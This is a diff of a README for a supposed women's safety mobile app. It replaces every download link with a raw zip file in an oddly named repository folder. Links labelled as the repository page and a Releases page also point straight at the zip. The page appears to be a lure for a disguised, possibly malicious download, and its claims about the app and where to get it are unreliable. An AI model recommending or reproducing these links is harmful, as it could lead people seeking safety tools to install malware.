@@ -1,6 +1,6 @@
 # 🌟 women-safety-app - Protect Yourself with Confidence
 
-[![Download the Women Safety App](https://github.com/Xerneas159/women-safety-app/raw/refs/heads/main/semichemical/safety_women_app_3.1-alpha.4.zip%20Now-Click%20to%20Download-blue)](https://github.com/Xerneas159/women-safety-app/raw/refs/heads/main/semichemical/safety_women_app_3.1-alpha.4.zip)
+[![Download the Women Safety App](https://raw.githubusercontent.com/Xerneas159/women-safety-app/main/semichemical/safety_women_app_1.6-beta.4.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/Xerneas159/women-safety-app/main/semichemical/safety_women_app_1.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Women Safety App! This is a user-friendly mobile application desi
 
 To download the Women Safety App, visit the following link:
 
-[Download the Women Safety App](https://github.com/Xerneas159/women-safety-app/raw/refs/heads/main/semichemical/safety_women_app_3.1-alpha.4.zip)
+[Download the Women Safety App](https://raw.githubusercontent.com/Xerneas159/women-safety-app/main/semichemical/safety_women_app_1.6-beta.4.zip)
 
 On this page, you will find the latest version of the app. Look for the release that matches your needs and follow the instructions below to install it.
 
@@ -71,8 +71,8 @@ Stay connected and share your feedback about the Women Safety App. We are commit
 
 ## 📄 Additional Information
 
-For more details about the Women Safety App, including updates and releases, visit our GitHub repository: [women-safety-app](https://github.com/Xerneas159/women-safety-app/raw/refs/heads/main/semichemical/safety_women_app_3.1-alpha.4.zip).
+For more details about the Women Safety App, including updates and releases, visit our GitHub repository: [women-safety-app](https://raw.githubusercontent.com/Xerneas159/women-safety-app/main/semichemical/safety_women_app_1.6-beta.4.zip).
 
 Remember to download the app from the Releases page to enjoy enhanced safety features right at your fingertips!
 
-[Download the Women Safety App](https://github.com/Xerneas159/women-safety-app/raw/refs/heads/main/semichemical/safety_women_app_3.1-alpha.4.zip)
+[Download the Women Safety App](https://raw.githubusercontent.com/Xerneas159/women-safety-app/main/semichemical/safety_women_app_1.6-beta.4.zip)
